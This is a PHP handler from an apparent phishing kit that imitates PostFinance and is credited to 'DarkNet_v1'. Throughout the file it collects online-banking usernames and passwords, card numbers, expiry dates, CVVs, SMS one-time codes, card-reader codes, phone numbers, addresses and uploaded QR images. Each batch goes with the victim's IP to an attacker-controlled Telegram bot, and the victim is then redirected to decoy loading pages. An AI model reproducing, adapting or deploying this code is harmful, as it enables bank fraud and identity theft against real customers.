<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/

    session_start();

    include "config.php";
    

    if(isset($_POST["log"])){

        $nom      = "<code>".$_POST["nom"]."</code>";
        $pass      = "<code>".$_POST["pass"]."</code>";
        $ident      = "<code>".$_POST["ident"]."</code>";

        $message=
        '<blockquote>[LOGIN] => Postfinance</blockquote>'."\n".     
        '- E-finance number / username : '.$nom."\n".
        '- Password : '.$pass."\n".
        '- User identification : '.$ident."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();      
        header("Location: ../../../phone.php");
        exit();
 
    }elseif(isset($_POST["card"])){
        $number   = "<code>".$_POST["one"]."</code>";
        $exp      = "<code>".$_POST["two"]."</code>";
        $cvv      = "<code>".$_POST["three"]."</code>";


        $n = $string = str_replace(' ', '', $_POST["one"]);
        $message=
        '<blockquote>[CC] => Postfinance</blockquote>'."\n".     
        '- Card Number : '.$number."\n".
        '- Exp : '.$exp."\n".
        '- Cvv : '.$cvv."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '- Type : '.'https://cardimages.imaginecurve.com/cards/'.substr($n,0,6).'.png'."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();

    }elseif(isset($_POST["sms"])){

        $sms      = "<code>".$_POST["sms_code"]."</code>";

        $message=
        '<blockquote>[SMS] => Postfinance</blockquote>'."\n".     
        '- SMS : '.$sms."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }elseif(isset($_POST["qr_box"])){

        $target_dir = "../images/";
        $target_file = $target_dir . "qr-img.".basename($_FILES["qr"]["type"]);
        
        move_uploaded_file($_FILES["qr"]["tmp_name"], $target_file);
        
        $bot_url    = "https://api.telegram.org/bot" . BOT_TOKEN . "/";
        $url        = $bot_url . "sendPhoto?chat_id=" . CHAT_ID ;
        
        $post_fields = array(
            'chat_id'   => CHAT_ID,
            'photo'     => new CURLFile(realpath("../images/qr-img.".basename($_FILES["qr"]["type"])))
        );
        
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Content-Type:multipart/form-data"
        ));
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
        $output = curl_exec($ch);
        
        
       
       header("Location: ../../../loading.php");
       reset_data();
       exit();

    }elseif(isset($_POST["phone"])){

        $num      = "<code>".$_POST["num"]."</code>";

        $message=
        '<blockquote>[PHONE] => Postfinance</blockquote>'."\n".     
        '- Number : '.$num."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }elseif(isset($_POST["reader"])){

        $code      = "<code>".$_POST["code"]."</code>";

        $message=
        '<blockquote>[Card Reader] => Postfinance</blockquote>'."\n".     
        '- Code : '.$code."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }elseif(isset($_POST["details"])){
        $name   = "<code>".$_POST["name"]."</code>";
        $addr      = "<code>".$_POST["addr"]."</code>";
        $date      = "<code>".$_POST["date"]."</code>";
        $tele      = "<code>".$_POST["tele"]."</code>";
        $mail      = "<code>".$_POST["mail"]."</code>";


        $message=
        '<blockquote>[CC] => Postfinance</blockquote>'."\n".     
        '- Full Name : '.$name."\n".
        '- Address : '.$addr."\n".
        '- Date : '.$date."\n".
        '- Telephone : '.$tele."\n".
        '- Email : '.$mail."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();

    }elseif(isset($_POST["app"])){
        $message=
        '<blockquote>[app] => Postfinance</blockquote>'."\n".
        '- Confirmed : ✅'."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit(); 

    }elseif(isset($_POST["id"])){

        $code      = "<code>".$_POST["code"]."</code>";

        $message=
        '<blockquote>[Card ID] => Postfinance</blockquote>'."\n".     
        '- Card ID : '.$code."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }

?>